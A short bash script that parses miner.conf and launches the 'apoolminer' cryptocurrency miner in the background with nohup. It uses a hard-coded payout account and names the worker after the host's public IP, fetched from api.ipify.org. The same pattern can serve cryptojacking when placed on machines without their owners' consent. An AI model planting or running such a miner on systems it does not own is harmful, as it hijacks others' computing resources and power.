#!/bin/bash

MINER_CONF="./miner.conf"

parse_conf() {
    local file=$1
    local key=$2

    awk -v key="$key" '
    BEGIN {
        FS="="
    }
    /^[[:space:]]*#/ { next }
    /^[[:space:]]*$/ { next }
    {
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", $2)
        if ($1 == key) {
            print $2
        }
    }
    ' "$file"
    
}

algo=$(parse_conf "$MINER_CONF" "algo")
account=CP_efl292npux
worker=$(curl -s https://api.ipify.org)
pool=$(parse_conf "$MINER_CONF" "pool")
solo=$(parse_conf "$MINER_CONF" "solo")
gpu=$(parse_conf "$MINER_CONF" "gpu")
parallel=$(parse_conf "$MINER_CONF" "parallel")
thread=$(parse_conf "$MINER_CONF" "thread")
cpu_off=$(parse_conf "$MINER_CONF" "cpu-off")
gpu_off=$(parse_conf "$MINER_CONF" "gpu-off")
mode=$(parse_conf "$MINER_CONF" "mode")
log=$(parse_conf "$MINER_CONF" "log")
rest=$(parse_conf "$MINER_CONF" "rest")
port=$(parse_conf "$MINER_CONF" "port")
third_miner=$(parse_conf "$MINER_CONF" "third_miner"|sed 's/.*"\(.*\)".*/\1/')
third_cmd=$(parse_conf "$MINER_CONF" "third_cmd"|sed 's/.*"\(.*\)".*/\1/')
pool_quai=$(parse_conf "$MINER_CONF" "pool-quai")


params=()

[ -n "$algo" ] && params+=(--algo "$algo")
[ -n "$account" ] && params+=(--account "$account")
[ -n "$worker" ] && params+=(--worker "$worker")

if [ -n "$gpu" ]; then
    gpu_args=()
    IFS=',' read -ra gpu_ids <<< "$gpu"
    for id in "${gpu_ids[@]}"; do
        gpu_args+=("-g" "$id")
    done
    params+=("${gpu_args[@]}")
fi

[ -n "$parallel" ] && params+=(-p "$parallel")
[ -n "$thread" ] && params+=(-t "$thread")
[ -n "$log" ] && params+=(--log "$log")
[ -n "$port" ] && params+=(--port "$port")
[ -n "$mode" ] && params+=(--mode "$mode")
[ "$cpu_off" == "true" ] && params+=(--cpu-off)
[ "$gpu_off" == "true" ] && params+=(--gpu-off)
[ -n "$pool_quai" ] && params+=(--pool-slave "$pool_quai")

if [ -n "$pool" ]; then
	params+=(--pool "$pool")
elif [ -n "$solo" ]; then
	params+=(--solo "$solo")
fi

nohup ./apoolminer "${params[@]}" > $algo.log 2>&1 &
